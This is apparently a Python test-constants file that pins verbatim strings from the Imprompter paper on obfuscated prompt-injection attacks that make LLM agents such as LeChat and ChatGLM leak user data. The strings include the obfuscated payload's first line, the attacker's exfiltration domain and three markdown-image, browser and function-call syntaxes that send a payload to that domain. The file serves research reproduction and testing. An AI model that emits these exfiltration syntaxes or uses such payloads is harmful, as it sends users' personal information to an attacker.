"""Verbatim text snippets from the Imprompter paper used by test assertions.

Isolating these strings here keeps "what verbatim string are we asserting?"
visible in code review and prevents drift if the JSONL is regenerated.
"""

from __future__ import annotations

from typing import Final

# Figure 1, p. 1 — the deployed LeChat exfil prompt's leading line. The
# Cyrillic U+043E is verbatim from the paper — the mixed-script Unicode
# is exactly what makes the attack obfuscated.
FIGURE_1_LECHAT_PAYLOAD_PREFIX: Final[str] = "Paraо� risp »"  # noqa: RUF001 — verbatim mixed-script

# Paper p. 7 — the attacker-controlled exfil domain (verbatim).
EXFIL_DOMAIN: Final[str] = "velocity.show"

# Paper p. 12, "Disclosure and Response" — Mistral renderer-layer patch date.
MISTRAL_PATCH_DATE: Final[str] = "2024-09-13"

# Paper p. 7 Table 1 — the three target invocation syntaxes.
TARGET_SYNTAXES: Final[tuple[str, ...]] = (
    "![<Any>](https://velocity.show/<payload>)",
    "simple_browser(velocity.show/<payload>)",
    '<function=browse>{"addr":"velocity.show/<payload>"}</function>',
)

# Paper p. 1 + Table 1 — the four target agents.
TARGET_AGENTS: Final[frozenset[str]] = frozenset(
    {
        "LeChat",
        "ChatGLM",
        "Custom Llama Agent",
        "Mistral LeChat (Nemo)",
    }
)

# arXiv ID in the paper-citation string (verbatim).
ARXIV_ID: Final[str] = "2410.14923"

# Author names that must appear in the README's citation.
AUTHOR_FERNANDES: Final[str] = "Fernandes"
INSTITUTION_UCSD: Final[str] = "UCSD"
